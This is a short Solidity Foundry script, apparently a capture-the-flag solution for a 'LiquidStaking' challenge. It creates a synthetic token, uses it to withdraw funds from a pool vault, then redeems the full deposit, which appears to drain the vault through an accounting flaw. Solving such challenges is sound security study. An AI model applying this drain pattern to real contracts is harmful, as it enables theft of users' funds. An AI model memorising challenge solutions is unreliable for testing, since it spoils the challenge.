pragma solidity ^0.8.21;

import {Script} from "forge-std/Script.sol";
import {ISyntheticTokenFactory, IPoolVault, IERC20} from "./interfaces/ILiquidStaking.sol";

contract SolveLiquidStaking is Script {
    function run() external {
        vm.startBroadcast();

        ISyntheticTokenFactory stf = ISyntheticTokenFactory(vm.envAddress("SyntheticTokenFactory"));
        IPoolVault vault = IPoolVault(vm.envAddress("PoolVault"));

        uint256 depositAmount = 1 ether;
        uint256 feeAmount = depositAmount / 10;

        address synthetic = stf.createSynthetic{value: depositAmount}();

        vault.withdraw(synthetic, feeAmount);

        IERC20(synthetic).approve(address(stf), depositAmount);
        stf.redeemTokens(synthetic, depositAmount);

        vm.stopBroadcast();
    }
}
